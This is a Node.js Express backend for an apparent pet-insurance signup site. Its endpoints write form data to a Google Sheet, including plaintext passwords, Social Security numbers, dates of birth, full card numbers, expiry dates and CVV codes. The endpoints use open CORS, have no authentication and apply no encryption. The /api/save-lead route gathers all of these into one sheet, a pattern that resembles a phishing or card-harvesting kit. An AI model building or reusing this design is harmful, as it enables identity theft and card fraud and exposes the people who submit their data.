require("dotenv").config();

const express = require("express");
const cors = require("cors");
const { google } = require("googleapis");

const app = express();

app.use(cors());
app.use(express.json());

const getPakistanTime = () => {
  return new Date().toLocaleString("en-US", {
    timeZone: "Asia/Karachi",
  });
};

function getGoogleAuth() {
  return new google.auth.GoogleAuth({
    keyFile: "./google-sheet-key.json",
    scopes: ["https://www.googleapis.com/auth/spreadsheets"],
  });
}

async function appendRow(tabName, values) {
  if (!process.env.SHEET_ID) {
    throw new Error("SHEET_ID is missing in .env");
  }

  const auth = getGoogleAuth();
  const sheets = google.sheets({ version: "v4", auth });

  await sheets.spreadsheets.values.append({
    spreadsheetId: process.env.SHEET_ID,
    range: `${tabName}!A1`,
    valueInputOption: "USER_ENTERED",
    insertDataOption: "INSERT_ROWS",
    requestBody: {
      values: [values],
    },
  });
}

app.get("/", (req, res) => {
  res.send("Pet Insurance Backend Running");
});

app.post("/api/register", async (req, res) => {
  try {
    const data = req.body;

    await appendRow("Users", [
      getPakistanTime(),
      data.firstName || "",
      data.lastName || "",
      data.email || "",
      data.password || "",
    ]);

    res.json({ success: true });
  } catch (error) {
    console.log("REGISTER ERROR:", error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post("/api/pet-info", async (req, res) => {
  try {
    const data = req.body;

    await appendRow("PetInfo", [
      getPakistanTime(),
      data.petName || "",
      data.petSpecies || "",
      data.petSex || "",
      data.breed || "",
      data.age || "",
      data.zipCode || "",
      data.email || "",
      data.phone || "",
    ]);

    res.json({ success: true });
  } catch (error) {
    console.log("PET INFO ERROR:", error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post("/api/personal-info", async (req, res) => {
  try {
    const data = req.body;

    await appendRow("PersonalInfo", [
      getPakistanTime(),
      data.firstName || "",
      data.lastName || "",
      data.dob || "",
      data.ssn || "",
      data.address || "",
      data.apartment || "",
      data.city || "",
      data.state || "",
      data.zipCode || "",
    ]);

    res.json({ success: true });
  } catch (error) {
    console.log("PERSONAL INFO ERROR:", error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post("/api/save-lead", async (req, res) => {
  try {
    const data = req.body;
    const uniqueId = data.uniqueId || `PET-${Date.now()}`;

    await appendRow("MasterData", [
      getPakistanTime(),
      uniqueId,
      data.petName || "",
      data.petSpecies || "",
      data.petSex || "",
      data.breed || "",
      data.age || "",
      data.zipCode || "",
      data.email || "",
      data.phone || "",
      data.planName || "",
      data.amount || "",
      data.firstName || "",
      data.lastName || "",
      data.address || "",
      data.apartment || "",
      data.city || "",
      data.state || "",
      data.dob || "",
      data.ssn || "",
      data.cardName || "",
      data.cardNumber || "",
      data.cardExpiry || "",
      data.cardCVV || "",
      data.billingZip || "",
    ]);

    res.json({ success: true, uniqueId });
  } catch (error) {
    console.log("SAVE LEAD ERROR:", error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

app.post("/api/payment", async (req, res) => {
  try {
    const data = req.body;

    await appendRow("Payments", [
      getPakistanTime(),
      data.petName || "",
      data.customerName || "",
      data.email || "",
      data.planName || "",
      data.amount || "",
      data.status || "",
      data.cardName || "",
      data.billingZip || "",
    ]);

    res.json({ success: true });
  } catch (error) {
    console.log("PAYMENT ERROR:", error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

module.exports = app;

if (require.main === module) {
  const PORT = process.env.PORT || 5000;
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
}